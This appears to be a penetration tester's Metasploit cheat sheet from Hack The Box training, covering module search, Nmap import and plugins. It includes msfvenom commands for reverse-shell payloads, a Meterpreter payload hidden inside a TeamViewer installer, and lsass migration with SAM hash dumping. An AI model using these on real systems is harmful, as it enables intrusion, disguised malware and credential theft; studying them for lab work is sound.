# Metasploit

- [Add custom module](#add-custom-module)
- [Paths](#paths)
- [Search](#search)
- [Generate payload](#generate-payload)
- [NMAP integration](#nmap-integration)
- [Plugins](#plugins)
- [Meterpreter](#meterpreter)
- [Msfvenom](#msfvenom)

## Add Custom Module

Eg. 

```
$ searchsploit lightweight facebook
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                              |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Lightweight facebook-styled blog 1.3 - Remote Code Execution (RCE) (Authenticated) (Metasploit)                                                             | php/webapps/50064.rb
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

Download 50064.rb from exploit-db.com

In your home, you should have `.msf4/modules` directory.

Create inside that directory the same folder structute ad "Path" in `searchsploit` output, in this case:

`.msf4/modules/php/webapps`

Copy .rb file in that directory; type `reload_all` in `msfconsole`.

You should be able to execute exploit with manually with:

`use 50064.rb`

rif. https://myitgeneralist.blogspot.com/2018/09/importing-exploit-db-exploits-into.html

To add modules at runtime:

```
sughenji@htb[/htb]$ cp ~/Downloads/9861.rb /usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_command_injection.rb
sughenji@htb[/htb]$ msfconsole -m /usr/share/metasploit-framework/modules/
```



## Paths

```
joshua@kaligra:~$ ls /usr/share/metasploit-framework/modules
auxiliary  encoders  evasion  exploits  nops  payloads  post
```

```
joshua@kaligra:~$ ls /usr/share/metasploit-framework/plugins/
aggregator.rb      beholder.rb  db_credcollect.rb  ffautoregen.rb  libnotify.rb  nessus.rb   pcap_log.rb  sample.rb            socket_logger.rb  thread.rb         wiki.rb
alias.rb           besecure.rb  db_tracker.rb      ips_filter.rb   msfd.rb       nexpose.rb  request.rb   session_notifier.rb  sounds.rb         token_adduser.rb  wmap.rb
auto_add_route.rb  capture.rb   event_tester.rb    lab.rb          msgrpc.rb     openvas.rb  rssfeed.rb   session_tagger.rb    sqlmap.rb         token_hunter.rb
```

```
joshua@kaligra:~$ ls /usr/share/metasploit-framework/scripts
meterpreter  ps  resource  shell
```

```
joshua@kaligra:~$ ls /usr/share/metasploit-framework/tools/
automation  context  dev  docs  exploit  hardware  memdump  modules  password  payloads  recon  smb_file_server.rb
```

## Search

Search for CVE in a specific year:

```
msf6 > search cve:2022

Matching Modules
================

   #   Name                                                                 Disclosure Date  Rank       Check  Description
   -   ----                                                                 ---------------  ----       -----  -----------
   0   exploit/windows/misc/cve_2022_28381_allmediaserver_bof               2022-04-01       good       No     ALLMediaServer 1.6 SEH Buffer Overflow
   1   exploit/multi/http/apache_apisix_api_default_token_rce               2020-12-07       excellent  Yes    APISIX Admin API default access token RCE
   2   exploit/multi/http/atlassian_confluence_namespace_ognl_injection     2022-06-02       excellent  Yes    Atlassian Confluence Namespace OGNL Injection
   3   exploit/windows/local/cve_2022_21999_spoolfool_privesc               2022-02-08       normal     Yes    CVE-2022-21999 SpoolFool Privesc
   4   exploit/linux/misc/cisco_rv340_sslvpn                                2022-02-02       good       Yes    Cisco RV340 SSL VPN Unauthenticated Remote Code Execution
   5   exploit/linux/local/cve_2022_0847_dirtypipe                          2022-02-20       excellent  Yes    Dirty Pipe Local Privilege Escalation via CVE-2022-0847
   6   exploit/multi/http/dotcms_file_upload_rce                            2022-05-03       excellent  Yes    DotCMS RCE via Arbitrary File Upload.
   7   exploit/linux/http/f5_icontrol_rce                                   2022-05-04       excellent  Yes    F5 BIG-IP iControl RCE via REST Authentication Bypass
   8   exploit/windows/http/manageengine_adselfservice_plus_cve_2022_28810  2022-04-09       excellent  Yes    ManageEngine ADSelfService Plus Custom Script Execution
   9   exploit/windows/fileformat/word_msdtjs_rce                           2022-05-29       excellent  No     Microsoft Office Word MSDTJS
   10  exploit/multi/http/mybb_rce_cve_2022_24734                           2022-03-09       excellent  Yes    MyBB Admin Control Code Injection RCE
   11  exploit/linux/redis/redis_debian_sandbox_escape                      2022-02-18       excellent  Yes    Redis Lua Sandbox Escape
   12  exploit/multi/http/spring_cloud_function_spel_injection              2022-03-29       excellent  Yes    Spring Cloud Function SpEL Injection
   13  exploit/multi/http/spring_framework_rce_spring4shell                 2022-03-31       manual     Yes    Spring Framework Class property RCE (Spring4Shell)
   14  exploit/windows/local/cve_2022_26904_superprofile                    2022-03-17       excellent  Yes    User Profile Arbitrary Junction Creation Local Privilege Elevation
   15  exploit/linux/http/vmware_workspace_one_access_cve_2022_22954        2022-04-06       excellent  Yes    VMware Workspace ONE Access CVE-2022-22954
   16  exploit/multi/http/wso2_file_upload_rce                              2022-04-01       excellent  Yes    WSO2 Arbitrary File Upload to RCE
   17  exploit/linux/local/cve_2022_0995_watch_queue                        2022-03-14       great      Yes    Watch Queue Out of Bounds Write
   18  exploit/windows/local/cve_2022_21882_win32k                          2021-02-09       average    Yes    Win32k ConsoleControl Offset Confusion
   19  auxiliary/admin/http/wp_masterstudy_privesc                          2022-02-18       normal     Yes    Wordpress MasterStudy Admin Account Creation
   20  exploit/unix/webapp/zoneminder_lang_exec                             2022-04-27       excellent  Yes    ZoneMinder Language Settings Remote Code Execution
   21  exploit/linux/http/zyxel_ztp_rce                                     2022-04-28       excellent  Yes    Zyxel Firewall ZTP Unauthenticated Command Injection
   22  exploit/osx/browser/osx_gatekeeper_bypass                            2021-03-25       manual     No     macOS Gatekeeper check bypass
```

Search with multiple parameters:

```
msf6 > search type:exploit platform:windows cve:2022 rank:excellent microsoft

Matching Modules
================

   #  Name                                        Disclosure Date  Rank       Check  Description
   -  ----                                        ---------------  ----       -----  -----------
   0  exploit/windows/fileformat/word_msdtjs_rce  2022-05-29       excellent  No     Microsoft Office Word MSDTJS
```

To get more info about an item:

```
msf6 > info 0

       Name: Microsoft Office Word MSDTJS
     Module: exploit/windows/fileformat/word_msdtjs_rce
   Platform: Windows
       Arch: x86, x64
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2022-05-29
..
..
..
References:
  https://nvd.nist.gov/vuln/detail/CVE-2022-30190
  https://www.reddit.com/r/blueteamsec/comments/v06w2o/suspected_microsoft_word_zero_day_in_the_wild/
  https://twitter.com/nao_sec/status/1530196847679401984?t=3Pjrpdog_H6OfMHVLMR5eQ&s=19
  https://app.any.run/tasks/713f05d2-fe78-4b9d-a744-f7c133e3fafb/
  https://doublepulsar.com/follina-a-microsoft-office-code-execution-vulnerability-1a47fce5629e
  https://twitter.com/GossiTheDog/status/1531608245009367040
  https://github.com/JMousqueton/PoC-CVE-2022-30190

Also known as:
  Follina
```

Show only payloads that contain `meterpreter`:

```
msf6 exploit(windows/smb/ms17_010_psexec) > grep meterpreter show payloads
   34   payload/windows/meterpreter/bind_hidden_ipknock_tcp                          normal  No     Windows Meterpreter (Reflective Injection), Hidden Bind Ipknock TCP Stager
   35   payload/windows/meterpreter/bind_hidden_tcp                                  normal  No     Windows Meterpreter (Reflective Injection), Hidden Bind TCP Stager
   36   payload/windows/meterpreter/bind_ipv6_tcp                                    normal  No     Windows Meterpreter (Reflective Injection), Bind IPv6 TCP Stager (Windows x86)
   37   payload/windows/meterpreter/bind_ipv6_tcp_uuid                               normal  No     Windows Meterpreter (Reflective Injection), Bind IPv6 TCP Stager with UUID Support (Windows x86)
..
..
```
	
Multiple conditions:

```
msf6 exploit(windows/smb/ms17_010_psexec) > grep meterpreter grep windows grep x64 show payloads
   191  payload/windows/x64/meterpreter/bind_ipv6_tcp                                normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager
   192  payload/windows/x64/meterpreter/bind_ipv6_tcp_uuid                           normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support
   193  payload/windows/x64/meterpreter/bind_named_pipe                              normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind Named Pipe Stager
   194  payload/windows/x64/meterpreter/bind_tcp                                     normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind TCP Stager
   195  payload/windows/x64/meterpreter/bind_tcp_rc4                                 normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager (RC4 Stage Encryption, Metasm)
   196  payload/windows/x64/meterpreter/bind_tcp_uuid                                normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager with UUID Support (Windows x64)
   197  payload/windows/x64/meterpreter/reverse_http                                 normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
   198  payload/windows/x64/meterpreter/reverse_https                                normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
   199  payload/windows/x64/meterpreter/reverse_named_pipe                           normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse Named Pipe (SMB) Stager
   200  payload/windows/x64/meterpreter/reverse_tcp                                  normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
   201  payload/windows/x64/meterpreter/reverse_tcp_rc4                              normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
   202  payload/windows/x64/meterpreter/reverse_tcp_uuid                             normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)
   203  payload/windows/x64/meterpreter/reverse_winhttp                              normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (winhttp)
   204  payload/windows/x64/meterpreter/reverse_winhttps                             normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTPS Stager (winhttp)
msf6 exploit(windows/smb/ms17_010_psexec) >
```

To search on exploit-db.com only in MSF format:

![exploitdb](https://user-images.githubusercontent.com/42389836/188301652-7600df8f-b214-4c68-b954-9db8ffe06317.JPG)

Search and exclude some language:

```
joshua@kaligra:~/Documents/htb/academy$ searchsploit -t nagios3 --exclude=".py"
```

## Generate payload

```
$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl
```

With encoding (`shikata_ga_nai`):

```
$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
```

Again with encoding and multiple iterations:

```
$ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe
```

## NMAP integration

Better to use XML format:

```
$ sudo nmap -T4 -F 192.168.88.1 -oX target.xml
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-03 16:29 CEST
Nmap scan report for 192.168.88.1
Host is up (0.0085s latency).
Not shown: 94 filtered tcp ports (no-response)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
23/tcp   open  telnet
53/tcp   open  domain
80/tcp   open  http
2000/tcp open  cisco-sccp
```

Start `postgresql`:

```
root@kaligra:~# systemctl start postgresql
root@kaligra:~# systemctl status postgresql
● postgresql.service - PostgreSQL RDBMS
     Loaded: loaded (/lib/systemd/system/postgresql.service; disabled; vendor preset: disabled)
     Active: active (exited) since Sat 2022-09-03 16:32:38 CEST; 2s ago
    Process: 17755 ExecStart=/bin/true (code=exited, status=0/SUCCESS)
   Main PID: 17755 (code=exited, status=0/SUCCESS)
        CPU: 2ms

Sep 03 16:32:38 kaligra systemd[1]: Starting PostgreSQL RDBMS...
Sep 03 16:32:38 kaligra systemd[1]: Finished PostgreSQL RDBMS.
```

Launch `msfconsole` and import file:

```
msf6 > db_import target.xml
[*] Importing 'Nmap XML' data
[*] Import: Parsing with 'Nokogiri v1.13.6'
[*] Importing host 192.168.88.1
[*] Successfully imported /home/joshua/Documents/htb/academy/metasploit/target.xml
msf6 >
```

List hosts:

```
msf6 > hosts

Hosts
=====

address       mac  name  os_name  os_flavor  os_sp  purpose  info  comments
-------       ---  ----  -------  ---------  -----  -------  ----  --------
10.0.2.4
192.168.88.1             Unknown                    device
```

List services:

```
msf6 > services
Services
========

host          port  proto  name        state  info
----          ----  -----  ----        -----  ----
10.0.2.4      445   tcp
192.168.88.1  21    tcp    ftp         open
192.168.88.1  22    tcp    ssh         open
192.168.88.1  23    tcp    telnet      open
192.168.88.1  53    tcp    domain      open
192.168.88.1  80    tcp    http        open
192.168.88.1  2000  tcp    cisco-sccp  open
```

## Plugins

Eg. "Dark Operator plugins"

```
joshua@kaligra:~/Documents/htb/academy/metasploit$ git clone https://github.com/darkoperator/Metasploit-Plugins
Cloning into 'Metasploit-Plugins'...
remote: Enumerating objects: 275, done.
remote: Total 275 (delta 0), reused 0 (delta 0), pack-reused 275
Receiving objects: 100% (275/275), 125.85 KiB | 1.28 MiB/s, done.
Resolving deltas: 100% (162/162), done.
```

```
joshua@kaligra:~/Documents/htb/academy/metasploit$ ls Metasploit-Plugins/
growl.rb  pentest.rb  README.md  twitt.rb
```

Copy `pentest.rb` to proper path:

```
joshua@kaligra:~/Documents/htb/academy/metasploit$ sudo cp Metasploit-Plugins/pentest.rb /usr/share/metasploit-framework/plugins/
```

Load new plugin:

```
msf6 > load pentest

       ___         _          _     ___ _           _
      | _ \___ _ _| |_ ___ __| |_  | _ \ |_  _ __ _(_)_ _
      |  _/ -_) ' \  _/ -_|_-<  _| |  _/ | || / _` | | ' \
      |_| \___|_||_\__\___/__/\__| |_| |_|\_,_\__, |_|_||_|
                                              |___/

Version 1.6
Pentest plugin loaded.
by Carlos Perez (carlos_perez[at]darkoperator.com)
[*] Successfully loaded plugin: pentest
```

## Meterpreter

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > hashdump
[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
meterpreter > lsa_dump_sam
[-] The "lsa_dump_sam" command requires the "kiwi" extension to be loaded (run: `load kiwi`)
```

Migrate to other process (`lsass`)

```
meterpreter > ps

Process List
============

 PID   PPID  Name                     Arch  Session  User                          Path
 ---   ----  ----                     ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System                   x64   0
 88    4     Registry                 x64   0
 272   604   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 280   4     smss.exe                 x64   0
 308   604   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 316   604   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 332   604   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 364   356   csrss.exe                x64   0
 468   356   wininit.exe              x64   0
 476   460   csrss.exe                x64   1
 532   460   winlogon.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
 604   468   services.exe             x64   0
 612   468   lsass.exe                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
..
..
```

```
meterpreter > migrate 612
[*] Migrating from 4872 to 612...
[*] Migration completed successfully.
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bdaffbfe64f1fc646a3353be1c2XXXXX:::
[-] Error running command hashdump: NoMethodError undefined method `id' for nil:NilClass
```

```
meterpreter > lsa_dump_sam
[+] Running as SYSTEM
[*] Dumping SAM
Domain : WIN-51BJ97BCIPV
SysKey : c897d22c1c56490b453e326f86b2eef8
Local SID : S-1-5-21-2348711446-3829538955-3974936019

SAMKey : e52d743c76043bf814df6e48f1efcb23

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: bdaffbfe64f1fc646a3353be1c2XXXX

..
..
RID  : 000003ea (1002)
User : htb-student
  Hash NTLM: cf3a5525ee9414229e66279623XXXXX
```	
	
## Msfvenom

Embed payloads into executable file:

```
$ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5
```


		
